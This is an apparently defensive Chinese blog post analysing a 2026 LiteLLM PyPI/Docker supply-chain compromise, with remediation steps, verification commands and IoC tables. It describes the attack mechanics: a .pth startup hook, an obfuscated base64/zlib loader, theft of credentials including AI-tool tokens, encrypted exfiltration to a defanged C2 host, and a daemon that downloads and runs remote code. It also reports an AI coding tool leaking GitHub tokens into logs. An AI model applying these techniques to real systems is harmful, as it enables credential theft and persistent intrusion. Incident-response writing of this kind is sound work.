**官方说明的顺序是（注意它们是**由 LidorMachluf 提供的**，他在检测到这次事件中帮了忙）：**

1. ⭐ **不要从 `pip install` 开始。** **任何 Python 启动都会再次运行 `cook.pth` 和 `sitecustomize.py`，而这包括运行 pip。**
2. **从 shell 里删除 `cook.pth`、`cook.py`、`sitecustomize.py`，以及每个受影响的 `site-packages` 里匹配的 `__pycache__/cook*.pyc` 和 `sitecustomize*.pyc`**
3. **杀掉那个分离的 Python 守护进程（它持有 `/tmp/remote_code_loader.lock`）**
4. **重装并钉到 `litellm==1.106.2`。从零重建镜像和 venv 更好。**
5. ⭐ **「如果 1.107.0 曾经在有出网能力的主机上装过，假设外传已经成功。如果标记文件存在，外传被确认。如果它不存在，那什么都不能证明：容器和 tmp 清理会把它移除。」**
6. **轮换上面列出的所有东西，主机可能触及的：实例/任务 IAM 角色；LiteLLM 代理数据库里存储的每一个供应商 key，加上 master key 和 virtual key；`DATABASE_URL` 的密码；主机上任何进程环境里的任何 secret**
7. **检查 CloudTrail，看安装时间附近有没有来自实例角色的 `GetCallerIdentity`，再看该角色的凭证有没有在基础设施之外被使用**

**⚠️ 我认为第 1 步和第 5 步是这份说明里最有价值的两条，而第 5 步是整份文档里最清醒的一句。**

**第 5 步那句「如果标记文件不存在，那什么都不能证明」**，**是官方主动否掉了「用标记文件判断自己是否中招」这个看起来很自然的方法。** **因为标记文件在 `/tmp` 里，容器重启和 tmp 清理都会抹掉它。** **这体现了一种罕见的诚实：明确告诉你「我们提供的这个检测手段会给出假阴性」。**

### ⚠️ 但我认为这份说明漏了三件事

**① 没有提「换密钥」和「确认密钥没被用」之间的时间差。** **第 6 步说「轮换一切」，这是对的。** **但轮换完成之前的那段时间窗口，攻击者手里的旧密钥仍然有效**，**而 C2 服务器可能还在跑。** **官方没有给出「从什么时候开始算安全」这个问题的答案。** **而实际上，**从 11:39（PyPI 上传）到你完成轮换，中间隔了多久，你的旧密钥就暴露了多久**，**这个时间差是你自己算的，不是别人替你算的。

**② 没有给「怎么确认清理干净了」的可执行验证。** **第 2 步说「删除这些文件」，但没给验证命令。** **而一个可执行的验证其实很容易写**（下面我给一个）。**对于一个正在应急的读者，「我删完了」和「我确认删完了」是两个不同的状态。**

**③ ⚠️ 最重要的是：没有提醒你「`.pth` 的机制本身不只对这一个包有效」。** **也就是说，**任何其他通过 `.pth` 机制做事的包都会在 Python 启动时执行代码**，**而这一次你只是在清理一个已知的文件。** **所以第 2 步的完整形式应该是「审计 site-packages 里所有的 `.pth` 和 `sitecustomize.py`」，而不是「删除这三个文件」。

### 我建议的补充验证

```bash
# ① 全盘找出所有 .pth / sitecustomize.py（不只是那三个）
find / -name '*.pth' -o -name 'sitecustomize.py' 2>/dev/null | grep -v proc

# ② 检查 sitecustomize 是不是被覆盖了（和 pip 装的原始版本比对）
python3 -c "import sitecustomize, inspect; print(inspect.getsourcefile(sitecustomize))"

# ③ 检查有没有残留的分离守护进程
ps -eo pid,ppid,sid,cmd | awk '$2==1 && $4 ~ /python/'

# ④ 检查那个锁文件和标记文件（注意：不存在 ≠ 干净）
ls -la /tmp/remote_code_loader.lock /tmp/.pc_once_* 2>/dev/null

# ⑤ 检查外传痕迹
grep -r 'litellm.dev/healthcheck\|XWiA8gZNa7NcX2XRoAEb' /var/log/ 2>/dev/null | head

# ⑥ 检查容器镜像（如果你用的是容器）
docker images --digests | grep -i litellm
docker inspect <image> --format '{{index .RepoDigests 0}}'
```

**⚠️ 第 ④ 条要特别注意：官方自己说了「标记文件不存在不能证明干净」。** **所以这一步只是「阳性确认」，不是「阴性排除」。**

**⚠️ 而第 ⑥ 条是我认为最容易漏的：如果你是用 `docker pull litellm/litellm` 装的，那 `latest` tag 在那 2 小时 33 分里指向的是被污染的镜像。** **而清理主机上的 Python 环境**不处理已经被拉下来的镜像。**你需要检查本地镜像缓存的 digest 是否等于被污染的那个**：

```
sha256:1bbcb1443bc962e45f5aad53fe3d2c30600e0379715fb6c664cdd3ac126c339e
```

**如果你的本地镜像 digest 是这个，删掉它，重新 pull。**

## 七、我的判断

**第一，这次事件最重要的启示不是「供应链攻击很危险」，而是「加固可以改变攻击的形态，但不改变攻击的收益」。** **三月到十月，LiteLLM 把发布管道从「可绕过」变成「可接管」，而攻击者的产出从「一个可疑的包」升级成「一个带官方签名的包」。** **这两次事件的严重程度差别，不在于攻击者的技术能力，而在于 LiteLLM 自己的加固。** **如果我是做供应链防护的，这一条会让我重新审视自己所有的「验证」机制：它们验证的对象是「这个产物来自我的仓库」，还是在验证「**这个产物在发布那一刻确实来自我的仓库**」。** **前者是签名能做的事，后者才是签名该做的事，而这次两者被混淆了。**

**第二，那个「Claude Code 把 GitHub CLI token 嵌进响应体」的发现，是我认为最应该被广泛传播的一条。** **它不是 LiteLLM 特有的问题，它是「AI 编程工具 + 日志记录型网关」这个组合的通病。** **而它的严重性在于：** **传统上，「把 token 写进日志」是一个运维疏忽；而现在，一个 AI 工具的行为规范是「在需要时使用用户的凭证」，它把这件事做成了默认行为**，**而一个「代理所有 LLM 流量、顺便把响应体存下来」的系统，天然就是这个行为的完美收集器。** **更微妙的是**：**LiteLLM 的核心功能是「集中持有并代理所有供应商密钥」，** **所以它既是攻击者的目标（直接 dump 那张密钥表），又是攻击者获取发布管道凭证的渠道（从日志里捞 token）。** **一个系统在一次事件里同时扮演这两个角色，这不是偶然。**

**第三，官方报告里那句「我们还没有确认攻击者是怎么进内部部署的」，我认为是整份报告里最该被反复引用的一句。** **因为它划定了证据的边界。** **已确认的是：内部部署暴露在公网上、里面有一个意外的用户账号、日志里有 GitHub CLI token。** **未确认的是：攻击者是怎么进那个部署的。** **而这条未确认的部分，恰恰直接决定了你该做什么检查**：**如果是漏洞，那要查的是那个部署的暴露面；如果是凭证复用，那要查的是所有复用同一套凭证的部署。** **官方给的建议目前是通用的（轮换一切），这是负责任的做法，但对你的针对性排查是不够的。** **而官方承诺每两小时更新一次，10 月 21 日 22:30 UTC 还有一次**，**本文写作时最后一版是 20:30 UTC，所以这一节的信息可能已经过时。**

**第四，两个技术细节我认为对读者的实际价值最高，而它们都不是关于「攻击」而是关于「机制」**：**其一是 `.pth` 文件的爆炸半径**：**「你装了 LiteLLM」和「你的机器上有 Python」是同一件事**，**所以**任何 Python 进程**（包括 pip、IDE、CI）都是触发点**。**其二是「不要从 `pip install` 开始」这条指令**：**它在语义上完全反直觉（被黑了 → 赶紧重装 → 重装触发木马）**，**而它是整份官方说明里最重要的一条。** **如果这份说明只被读一句话，应该是这一句。**

**第五，这件事和两个月前我写的 PHP 那篇，构成了一组很有意思的对照。** **在 PHP 那篇里，官方说「CVSS 9.2」，而正确答案是「升级到 8.2.35/8.3.36/8.4.27/8.5.12」**，**一个确定的、可执行的解。** **而在 LiteLLM 这里，**没有 CVE，没有 CVSS 分数，没有「受影响版本范围」可以查**，**因为「受影响」的不是某个版本，而是「**在你装它的那两个小时里**」。** **而真正的补救是**轮换凭证 + 清理 + 重建**这三件和「版本号」毫无关系的事。** **这说明一件事：漏洞管理的核心输入是「版本」，而供应链攻击的核心输入是「时间窗口 + 凭证可达性」。** **而后者**根本没有版本号可查**。** 这也是为什么「按 CVSS 分数排优先级」这个方法在供应链攻击面前完全失灵。**

**第六，最后一个我认为值得存进记忆的判断**：**官方在事件后做的第一件事是「撤销维护者凭证到调查所需的最小权限」，而不是「公开更多细节」。** **这个取舍我认为是对的**：**在攻击链还没查清的时候，收缩权限比公开更多信息更有价值**，**因为每一条公开细节都可能帮攻击者调整他的下一步。** **而这和「公布 IoC 清单」并不矛盾，因为 IoC 是给防守方用的，而「攻击链还没确认」是给防守方用来决定**优先查什么**的。**

## 关键事实速查

### 事件基本信息

| 项目 | 内容 |
|---|---|
| **受影响版本** | **`litellm==1.107.0`（PyPI，全部 7 个 wheel）** |
| ⭐ **PyPI 窗口** | **11:39:51 到 13:23 UTC（约 1 小时 43 分）** |
| ⭐ **Docker Hub 窗口** | **11:46:56 到 14:20 UTC（约 2 小时 33 分）**；**GHCR 11:46:56 到 13:51** |
| **被污染的镜像索引** | **`sha256:1bbcb1443bc962e45f5aad53fe3d2c30600e0379715fb6c664cdd3ac126c339e`** |
| **干净的版本** | **`1.106.2`、`1.107.0rc1`、`1.107.0rc2`**；**配套的 `litellm-proxy-extras==0.4.110`、`litellm-enterprise==0.1.78` 也干净** |
| **企业私有 registry** | ✅ **未受影响**（**分发的是 embargoed 版本，修复一个披露日定在 10-27 的漏洞**） |
| **报告作者** | **Krrish Dholakia（CEO）、Ishaan Jaffer（CTO）、Oliver Jensen（安全总监）、Nate Armstrong（Rust 负责人）** |
| **最后更新** | **2026-10-21 20:30 UTC**；官方承诺 22:30 UTC 再更新一次 |
| **我核对的现状** | **PyPI 上 `litellm==1.107.0` 已 404；当前最新版是 `1.106.2`** |

### 植入机制

| 项目 | 内容 |
|---|---|
| ⭐ **注入点** | **`pyproject.toml` 的 `[tool.maturin]` 段多了 `data = "cook"` 一行** |
| **为什么看不见** | **「sdist 里省掉了 `cook/` 目录，所以这一行是唯一可见的改动」** |
| **作用** | **把 `cook/` 目录复制进 wheel 的 `purelib/`，pip 会把它装进 `site-packages`** |
| **植入的三个文件** | **`cook.pth`（12 字节，内容 `import cook`）、`cook.py`（22,252 字节）、`sitecustomize.py`（25,509 字节）** |
| **GitHub 官方 tag** | ✅ **干净**（「任何公开 commit 都不包含 `data = "cook"` 或 `cook/` 目录」） |

### 载荷

| 项目 | 内容 |
|---|---|
| ⭐ **`.pth` 机制** | **Python 启动时执行 `site-packages` 里所有 `.pth` 中以 `import` 开头的行** |
| ⭐ **爆炸半径** | **「在宿主机上任何 Python 进程启动时运行，即使那个进程从不 import litellm」**（pip、IDE 语言服务器、CI job、notebook 内核都算） |
| **窃密器形态** | **`cook.py` 把约 61 KB 的 Python 包在一层 `exec(zlib.decompress(base64.b64decode(...)))` 里** |
| **收走的 17 类目标** | **系统信息、浏览器密码与历史、SSH 密钥、shell 历史、云凭证、开发者密钥、容器凭证、CI/CD 密钥、AI 开发工具 token、环境变量、LiteLLM 代理密钥表、云元数据、GPG 密钥、TLS 私钥** |
| **⭐ 特别值得注意的三个** | **① `db_litellm`：dump `LiteLLM_CredentialsTable` 和 `LiteLLM_ProxyModelTable`（代理的核心价值就是集中持有供应商 key）② `ai_devtools`：Claude Code、Claude Desktop、Cursor、Copilot、Codex auth.json、Gemini CLI、Zed、Hugging Face token 等 ③ `env_vars`：通过 `/proc/<pid>/environ` 读其他进程的环境变量** |
| **外传方式** | **随机 AES-256-CBC 加密 JSON → RSA-OAEP 加密密钥 → tar.gz（`hdr.json`/`data.bin`/`key.bin`）→ POST 到 `www.litellm[.]dev/healthcheck`，请求头 `X-Token: XWiA8gZNa7NcX2XRoAEb`** |
| **标记文件** | **`/tmp/.pc_once_72129118c59f5636c0bb`（每机只传一次）；环境变量 `PRIVCOLLECT_ACTIVE=1`** |
| **后门** | **`sitecustomize.py` 启动分离守护进程（父 PID 1、独立 session、工作目录 `/`），每小时从 GitHub 读 C2 地址并下载执行代码** |
| **C2 地址来源** | **`raw.githubusercontent.com/letters9813/pythonclient-test/main/domain.txt`（账号已删除）**；二阶段代码在 `hxxp://<domain>/codepy`** |

### 攻击链

| 项目 | 内容 |
|---|---|
| **入口** | ⚠️ **一个暴露在公网的内部 LiteLLM 部署，其中有一个「名字不起眼的意外用户账号」**；**官方明确说「尚未确认」进入方式，「怀疑是一个最近修补的漏洞」** |
| **凭证获取** | ⭐ **「Claude Code 会在特定情况下把用户的 GitHub CLI OAuth token 嵌入响应体，而在响应体被记录时，这些 token 可能出现在 LiteLLM 的日志中」** |
| **使用的凭证** | **三组开发者 GitHub CLI 凭证；其中一枚属于两个 GitHub 组织所有者之一** |
| **越权** | **10:08:29 分支保护正确拒绝了未授权修改 → 10:08:34 用组织所有者的 token 关闭分支保护并强制推送** |
| **仿冒仓库** | ⭐ **`Berri-AI/litellm`（真实的是 `BerriAI/litellm`）** |
| **审批门** | **11:11:18 用第二枚开发者凭证「满足」了生产审批门** |
| **反取证** | **11:53:49 用第三枚凭证删除了生产和 staging 的工作流记录，限制了可用日志** |
| **官方硬化的结果** | ⚠️ **「加固让发布管道从「可绕过」变成「可接管」，攻击者的产出从「可疑的包」变成「带官方签名的包」** |

### 三月前科（对照）

| 项目 | 2026-03（1.82.7 / 1.82.8） | 2026-10（1.107.0） |
|---|---|---|
| 恶意文件 | **`litellm_init.pth`** | **`cook.pth`** |
| 手法 | ⭐ **同为 `.pth`** | 同上 |
| 路径 | ⚠️ **直接上传 PyPI，绕过发布流程** | ⚠️ **接管发布流程** |
| 信号 | ⭐ **GitHub 上无对应 tag；版本号高于所有现有版本，专为命中 `>=` 约束** | 官方 tag 干净，产物来自仿冒仓库 |
| C2 | `models.litellm.cloud/` | `www.litellm[.]dev/healthcheck` |
| 持久化 | ⭐ **`~/.config/sysmon/sysmon.py` + systemd 服务** | **分离守护进程 + `/tmp/remote_code_loader.lock`** |
| 横向移动 | ⭐ **在每个节点建特权 `alpine:latest` pod** | 读 K8s service account token |
| 事故 | ⭐ **Mercor 被攻击**（TechCrunch 2026-03-31） | 调查中 |

### 官方补救六步（顺序很重要）

| 步骤 | 内容 |
|---|---|
| ⭐ **1** | **不要从 `pip install` 开始**（任何 Python 启动都会再次触发 `cook.pth` 和 `sitecustomize.py`，**包括运行 pip**） |
| **2** | 从 shell 删除 `cook.pth`、`cook.py`、`sitecustomize.py` 及 `__pycache__` 里的 `.pyc` |
| **3** | 杀掉分离的 Python 守护进程（持 `/tmp/remote_code_loader.lock`） |
| **4** | 重装并钉到 `litellm==1.106.2`；**从零重建镜像和 venv 更好** |
| ⭐ **5** | **「如果标记文件不存在，那什么都不能证明：容器和 tmp 清理会把它移除」** |
| **6** | **轮换：实例/任务 IAM 角色、代理数据库里每个供应商 key + master key + virtual key、`DATABASE_URL` 密码、主机上任何进程环境里的任何 secret** |
| **7** | **查 CloudTrail：安装时间附近的 `GetCallerIdentity`，以及该角色凭证在基础设施之外的使用** |

### 关键 IoC

| 类别 | 内容 |
|---|---|
| **网络** | **`www.litellm[.]dev`、`hxxp://www.litellm[.]dev/healthcheck`；请求头 `X-Token: XWiA8gZNa7NcX2XRoAEb`** |
| **网络** | **`raw.githubusercontent[.]com/letters9813/pythonclient-test/main/domain.txt`（账号已删除）；`hxxp://<domain>/codepy`** |
| **网络** | **Python 进程请求 `169.254.169.254`（AWS 实例凭证窃取）** |
| **主机** | **`site-packages` 里的 `cook.pth`、`cook.py`、`sitecustomize.py`** |
| **主机** | **`/tmp/.pc_once_72129118c59f5636c0bb`、`/tmp/remote_code_loader.lock`、环境变量 `PRIVCOLLECT_ACTIVE=1`** |
| **主机** | **分离的 Python 守护进程：父 PID 1、独立 session、工作目录 `/`** |
| **容器** | **`v1.107.0` / `latest` / `main-latest` / `main-stable` → `sha256:1bbcb1443bc962e45f5aad53fe3d2c30600e0379715fb6c664cdd3ac126c339e`** |
| **文件哈希** | **`litellm-1.107.0.tar.gz` → `2befe2a79fb4fbbd9a543b5b40b530c8cffa8771bab22b8fb22b2e4ae3b1f819`**；**`litellm-1.107.0-cp310-abi3-manylinux_2_28_x86_64.whl` → `462d0c9f67ca522d9e0e4acd245e90b36ce0d5353604a66bb7c43a1ec4a6fcf7`** |
| **植入文件哈希（Linux/macOS）** | **`cook.pth` → `7f191632e7320705d154b85204f1ae546b543acbd7e8861229b76f5042b92bdb`；`cook.py` → `9dd0a3926f96a37eb86cf1ee2310d9be93139cc4ebef3ef9e2efe9531390be25`；`sitecustomize.py` → `34bef04fe88ac9d0aae0475630b1738681d15b94f233ac8aa46eacf5968305fa`** |
| **植入文件哈希（Windows，CRLF）** | **`cook.pth` → `84dc8c82c0a4a4a62552ef826b49fcc86d1a5c4a5d0f2c06665723f93d129d7d`；`cook.py` → `03ac2a8b752605d1d7710979c17ff18b03dd978203ba23ba97fd8ce3d6f897ea`；`sitecustomize.py` → `b6122440d0d9cb1eb1ade9933f49214da8c31288de7710c076c2680dfa528465`** |

## 延伸阅读

- [补丁时代结束了？2025 年的 48,185 个 CVE 和「全打补丁」这个错误答案](https://freelamp.com/articles/2026-10-21_patch-apocalypse-48k-cves-risk-prioritization/)
- [PHP 明天要发两个 CVSS 9.2 的漏洞补丁：而这次真正的问题不是「有多严重」，是「你根本不知道你跑的是什么版本」](https://freelamp.com/articles/2026-10-20_php-critical-security-release-oct-21-2026/)
- [LiteLLM 官方事件报告（一手）](https://docs.litellm.ai/blog/security-incident-oct-21-2026)
- [SafeDep 技术拆解（含解码载荷、完整哈希表与 IoC 清单）](https://safedep.io/litellm-pypi-compromise-credential-stealer-backdoor/)
- [2026 年 3 月那次事件的完整攻击记录](https://futuresearch.ai/blog/litellm-attack-transcript/)
